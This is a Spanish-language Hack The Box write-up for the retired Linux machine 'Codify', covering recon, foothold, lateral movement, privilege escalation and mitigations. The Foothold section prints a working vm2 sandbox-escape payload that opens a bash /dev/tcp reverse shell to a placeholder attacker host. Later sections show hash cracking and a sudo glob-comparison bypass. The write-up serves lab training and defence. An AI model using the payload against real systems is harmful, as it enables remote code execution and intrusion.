---
machine: Codify
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, vm2, sandbox-escape, privesc]
---

# Codify — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La web ofrece un playground de JavaScript con vm2 3.9.16, vulnerable a varias CVEs de escape de sandbox. Se ejecuta código en el host y se obtiene `svc`; una base SQLite de la aplicación de contacto filtra un hash bcrypt que se crackea para `joshua`. `joshua` puede ejecutar `mysql-backup.sh` con sudo; el glob `*` salta la comprobación y `pspy` captura la contraseña de MySQL de root, que se reutiliza para `su`.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,3000 <IP>
```

- `22` SSH, `80` nginx y `3000` la aplicación Node.js del playground.
- La web muestra un editor que ejecuta JavaScript en un sandbox.
- `whatweb` y el código de la página identifican vm2 3.9.16.

## Enumeración

- vm2 3.9.16 es vulnerable a CVE-2023-32314, CVE-2023-30547, CVE-2023-37466 y CVE-2023-37903.
- El sandbox no aísla el proceso del sistema; un `Error.prepareStackTrace` permite escapar.
- `/var/www/contact` contiene una aplicación PHP con SQLite.

## Foothold

Se pega un PoC de escape en el playground y se ejecuta una reverse shell como `svc`.

```javascript
const { VM } = require("vm2");
new VM().run('err = new Error(); err.name = { toString: new Proxy(() => "", { apply(target, thiz, args) { const process = args.constructor.constructor("return process")(); throw process.mainModule.require("child_process").execSync("bash -c \\"bash -i >& /dev/tcp/<ATTACKER>/443 0>&1\\""); } }) }; err.stack;');
```

## Movimiento lateral

La base `contact.db` guarda usuarios y hashes bcrypt. Se vuelca, se crackea el de `joshua` y se entra por SSH.

```bash
sqlite3 contact.db 'select username,password from users;'
hashcat -m 3200 joshua.hash rockyou.txt
ssh joshua@<IP>
```

## Escalada de privilegios

`joshua` puede ejecutar `/opt/scripts/mysql-backup.sh` con sudo. El script compara la contraseña con un glob sin comillas; `*` coincide con cualquier cosa y salta la comprobación. `pspy` muestra el `mysqldump` con la contraseña de root, que también sirve para `su`.

```bash
sudo /opt/scripts/mysql-backup.sh
# introducir *
./pspy64
su -
```

## Evidencia

- vm2 3.9.16 y escape del sandbox.
- Hash bcrypt de `joshua` crackeado.
- `mysql-backup.sh` con glob `*`.
- Contraseña de root capturada y `su` correcto.

## Lecciones aprendidas

- Un sandbox JavaScript no es una frontera si la versión tiene CVEs públicos.
- Las bases SQLite de aplicaciones internas suelen contener hashes reutilizados.
- Comparar contraseñas con globs sin comillas permite bypass y filtra argumentos.

## Mitigación y detección

- Actualizar vm2 o usar `isolated-vm`; no ejecutar código de usuarios.
- Usar bcrypt/Argon2 y contraseñas únicas.
- Citar variables, usar `read -r` y no pasar secretos por la línea de comandos.

## Referencias

- [0xdf — Codify](https://0xdf.gitlab.io/2024/04/06/htb-codify.html)
- [IppSec — Codify](https://www.youtube.com/watch?v=wH1Lp-sEVv4)
- [Hack The Box — Codify](https://app.hackthebox.com/machines/codify)
